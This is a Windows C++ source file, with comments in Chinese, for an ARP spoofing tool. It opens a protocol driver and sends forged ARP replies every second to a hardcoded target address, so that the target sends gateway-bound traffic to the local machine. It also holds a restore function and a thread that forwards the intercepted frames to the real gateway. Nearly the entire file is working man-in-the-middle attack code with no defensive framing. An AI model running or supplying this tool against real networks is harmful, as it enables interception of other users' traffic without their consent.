////////////////////////////////////////////////
// SpoofArp.cpp文件

#include "../common/initsock.h"
#include <ntddndis.h>
#include <windows.h>
#include <stdio.h>
#include <Iphlpapi.h>


#include "protoutils.h"
#include "ProtoPacket.h"


#pragma comment(lib, "Iphlpapi.lib")


DWORD WINAPI ForwardThread(LPVOID lpParam);
BOOL GetGlobalData();
void SpoofTarget(CArpPacket *pArp, DWORD dwDestIP);
void UnspoofTarget(CArpPacket *pArp, DWORD dwDestIP);

/////////////////////////////////////////
// 全局数据
u_char	g_ucLocalMac[6];	// 本地MAC地址
DWORD	g_dwGatewayIP;		// 网关IP地址
DWORD	g_dwLocalIP;		// 本地IP地址
DWORD	g_dwMask;			// 子网掩码

u_char g_ucGatewayMac[6];   // 网关MAC地址


CInitSock theSock;



int main()
{
	// 获取全局数据
	GetGlobalData();
	// 启动服务
	if(!ProtoStartService())
	{
		printf(" ProtoStartService() failed %d \n", ::GetLastError());
		return -1;
	}
	// 打开控制设备对象
	HANDLE hControlDevice = ProtoOpenControlDevice();
	if(hControlDevice == INVALID_HANDLE_VALUE)
	{
		printf(" ProtoOpenControlDevice() failed() %d \n", ::GetLastError());
		ProtoStopService();
		return -1;
	}
	// 枚举绑定的下层适配器
	CPROTOAdapters adapters;
	if(!adapters.EnumAdapters(hControlDevice))
	{
		printf(" Enume adapter failed \n");
		ProtoStopService();
		return -1;
	}


	// 得到网关的MAC地址
	memset(g_ucGatewayMac, 0xff, 6);
	ULONG ulLen = 6;
	if(!::SendARP(g_dwGatewayIP, 0, (ULONG*)g_ucGatewayMac, &ulLen) == NO_ERROR)
	{
		printf(" 取得网关的MAC地址出错 \n");
		return -1;
	}

	CAdapter adapter;
	// 默认使用第一个适配器
	if(!adapter.OpenAdapter(adapters.m_pwszSymbolicLink[0], TRUE))
	{
		printf(" OpenAdapter failed \n");
		ProtoStopService();
		return -1;
	}

	CArpPacket arp(&adapter);
	CArpPacket *pArp = &arp;

	/////////////////////////////////////////////////////////////////////	
	// 要欺骗的目标地址
	char szDestIP[] = "10.16.115.89";
	
	// 创建转发封包的线程
	// ...			// ::CloseHandle(::CreateThread(NULL, 0, ForwardThread, &adapter, 0, NULL));

	while(TRUE)
	{
		SpoofTarget(pArp, ::inet_addr(szDestIP));
		::Sleep(1000);
	}

	return 0;
}

void SpoofTarget(CArpPacket *pArp, DWORD dwDestIP)
{	
	// 得到目标MAC地址
	u_char arDestMac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
	ULONG ulLen = 6;
	if(::SendARP(dwDestIP, 0, (ULONG*)arDestMac, &ulLen) != NO_ERROR)
	{
		printf(" 取得目标MAC地址出错 \n");
		return;
	}

	// 让目标机器在ARP表中记下“g_ucLocalMac, g_dwGatewayIP”对
	pArp->SendPacket(arDestMac, g_ucLocalMac, 
			ARPOP_REPLY, arDestMac, dwDestIP, g_ucLocalMac, g_dwGatewayIP); 
}

void UnspoofTarget(CArpPacket *pArp, DWORD dwDestIP)
{
	// 得到目标MAC地址
	u_char arDestMac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
	ULONG ulLen = 6;
	if(::SendARP(dwDestIP, 0, (ULONG*)arDestMac, &ulLen) != NO_ERROR)
	{
		printf(" 取得目标MAC地址出错 \n");
		return;
	}

	// 让目标机器在ARP表中记下“g_ucGatewayMac, g_dwGatewayIP”对
	pArp->SendPacket(arDestMac, g_ucLocalMac, 
			ARPOP_REPLY, arDestMac, dwDestIP, g_ucGatewayMac, g_dwGatewayIP); 
}


BOOL GetGlobalData()
{
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG ulLen = 0;

	// 为适配器结构申请内存
	::GetAdaptersInfo(pAdapterInfo,&ulLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)::GlobalAlloc(GPTR, ulLen);

	// 取得本地适配器结构信息
	if(::GetAdaptersInfo(pAdapterInfo,&ulLen) ==  ERROR_SUCCESS)
	{
		if(pAdapterInfo != NULL)
		{
			memcpy(g_ucLocalMac, pAdapterInfo->Address, 6);
			g_dwGatewayIP = ::inet_addr(pAdapterInfo->GatewayList.IpAddress.String);
			g_dwLocalIP = ::inet_addr(pAdapterInfo->IpAddressList.IpAddress.String);
			g_dwMask = ::inet_addr(pAdapterInfo->IpAddressList.IpMask.String);
		}
	}
	::GlobalFree(pAdapterInfo);

	printf(" \n -------------------- 本地主机信息 -----------------------\n\n");
	in_addr in;
	in.S_un.S_addr = g_dwLocalIP;
	printf("      IP Address : %s \n", ::inet_ntoa(in));

	in.S_un.S_addr = g_dwMask;
	printf("     Subnet Mask : %s \n", ::inet_ntoa(in));

	in.S_un.S_addr = g_dwGatewayIP;
	printf(" Default Gateway : %s \n", ::inet_ntoa(in));

	u_char *p = g_ucLocalMac;
	printf("     MAC Address : %02X-%02X-%02X-%02X-%02X-%02X \n", p[0], p[1], p[2], p[3], p[4], p[5]);

	printf(" \n \n ");

	return TRUE;
}


DWORD WINAPI ForwardThread(LPVOID lpParam)
{
	// 下面的CMyAdapter类是为了访问CAdapter类的保护成员m_hAdapter
	class CMyAdapter : public CAdapter
	{
	public:
		HANDLE GetFileHandle() { return m_hAdapter; }
	};

	CMyAdapter *pAdapter = (CMyAdapter *)lpParam;

	printf(" 开始转发数据... \n");
	// 提升线程优先级，为的是尽量不丢失数据帧
	::SetThreadPriority(::GetCurrentThread(), THREAD_PRIORITY_ABOVE_NORMAL);

#define MAX_IP_SIZE        65535

	char frame[MAX_IP_SIZE];
	OVERLAPPED olRead = { 0 };
	OVERLAPPED olWrite = { 0 };
	olRead.hEvent = ::CreateEvent(NULL, FALSE, FALSE, NULL);
	olWrite.hEvent = ::CreateEvent(NULL, FALSE, FALSE, NULL);
	int nRecvLen;
	ETHeader *pEthdr = (ETHeader *)frame;
	// 开始转发数据
	while(TRUE)
	{
		nRecvLen = pAdapter->RecieveData(frame, MAX_IP_SIZE, &olRead);
		if(nRecvLen == -1 && ::GetLastError() == ERROR_IO_PENDING)
		{
			if(!::GetOverlappedResult(pAdapter->GetFileHandle(), &olRead, (PDWORD)&nRecvLen, TRUE))
				break;
		}
		if(nRecvLen > 0)
		{
			// 修改封包的目的MAC地址之后，再将封包发送到LAN
			if(pEthdr->type == htons(ETHERTYPE_IP))
			{
				IPHeader *pIphdr = (IPHeader *)(frame + sizeof(ETHeader));
				if(pIphdr->ipDestination == g_dwGatewayIP)
				{
					memcpy(pEthdr->dhost, g_ucGatewayMac, 6);
					pAdapter->SendData(frame, nRecvLen, &olWrite);
					printf(" 转发一个封包【源IP：%s】\n", 
									::inet_ntoa(*((in_addr*)&pIphdr->ipSource)));
				}
			}
		}
	}
	printf(" 转发线程退出 \n");
	return 0;
}


